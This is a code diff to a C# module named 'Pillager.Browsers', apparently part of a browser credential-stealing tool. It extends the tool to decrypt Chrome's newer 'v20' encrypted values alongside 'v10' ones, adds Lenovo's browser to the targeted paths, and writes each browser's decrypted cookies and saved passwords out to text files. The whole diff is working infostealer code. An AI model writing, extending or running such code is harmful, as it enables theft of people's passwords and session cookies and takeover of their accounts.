@@ -15,7 +15,9 @@ namespace Pillager.Browsers
 
         public string BrowserName { get; set; }
 
-        public byte[] MasterKey { get; set; }
+        public byte[] MasterKey_v10 { get; set; }
+
+        public byte[] MasterKey_v20 { get; set; }
 
         private string[] profiles { get; set; }
 
@@ -46,41 +48,22 @@ namespace Pillager.Browsers
             { "Opera", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"Opera Software\\Opera Stable" )},
             { "Opera GX", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"Opera Software\\Opera GX Stable" )},
             { "The World", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"theworld6\\User Data" )},
+            { "Lenovo", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Lenovo\\SLBrowser\\User Data" )},
         };
-
-        public byte[] GetMasterKey()
-        {
-            string filePath = Path.Combine(BrowserPath, "Local State");
-            byte[] masterKey = new byte[] { };
-            if (!File.Exists(filePath))
-                return null;
-            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath).Replace(" ", ""));
-            foreach (System.Text.RegularExpressions.Match prof in pattern)
-            {
-                if (prof.Success)
-                    masterKey = Convert.FromBase64String((prof.Groups[1].Value));
-            }
-            byte[] temp = new byte[masterKey.Length - 5];
-            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);
-            try
-            {
-                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
-            }
-            catch
-            {
-                return null;
-            }
-        }
 
         private byte[] DecryptData(byte[] buffer)
         {
             byte[] decryptedData = null;
-            if (MasterKey is null) return null;
+            if (MasterKey_v10 is null && MasterKey_v20 is null) return null;
             try
             {
                 string bufferString = Encoding.UTF8.GetString(buffer);
-                if (bufferString.StartsWith("v10") || bufferString.StartsWith("v11"))
+                if (bufferString.StartsWith("v10") || bufferString.StartsWith("v11") || bufferString.StartsWith("v20"))
                 {
+                    byte[] masterKey = MasterKey_v10;
+                    if (bufferString.StartsWith("v20"))
+                        masterKey = MasterKey_v20;
+
                     byte[] iv = new byte[12];
                     Array.Copy(buffer, 3, iv, 0, 12);
                     byte[] cipherText = new byte[buffer.Length - 15];
@@ -89,14 +72,19 @@ namespace Pillager.Browsers
                     Array.Copy(cipherText, cipherText.Length - 16, tag, 0, 16);
                     byte[] data = new byte[cipherText.Length - tag.Length];
                     Array.Copy(cipherText, 0, data, 0, cipherText.Length - tag.Length);
-                    decryptedData = new AesGcm().Decrypt(MasterKey, iv, null, data, tag);
+                    decryptedData = new AesGcm().Decrypt(masterKey, iv, null, data, tag);
+                    if (bufferString.StartsWith("v20"))
+                        decryptedData = decryptedData.Skip(32).ToArray();
                 }
                 else
                 {
                     decryptedData = ProtectedData.Unprotect(buffer, null, DataProtectionScope.CurrentUser);
                 }
             }
-            catch { }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+            }
             return decryptedData;
         }
 
@@ -284,8 +272,13 @@ namespace Pillager.Browsers
                     string chromepath = browser.Value;
                     BrowserName = browser.Key;
                     BrowserPath = chromepath;
-                    MasterKey = GetMasterKey();
-                    if (MasterKey == null) continue;
+                    var MasterKey = ChromeKeyDecryption.GetChromeMasterKey(chromepath);
+                    MasterKey_v10 = MasterKey.MasterKey_v10;
+                    MasterKey_v20 = MasterKey.MasterKey_v20;
+
+                    if (MasterKey_v10 == null && MasterKey_v20 == null)
+                        continue;
+
                     List<string> profileslist = new List<string>
                     {
                         "Default"
@@ -302,7 +295,7 @@ namespace Pillager.Browsers
                     string savepath = Path.Combine(path, BrowserName);
                     Directory.CreateDirectory(savepath);
                     string cookies = Chrome_cookies();
-                    if (!string.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies,Encoding.UTF8);
+                    if (!string.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies, Encoding.UTF8);
                     string passwords = Chrome_passwords();
                     if (!string.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords, Encoding.UTF8);
                     string books = Chrome_books();
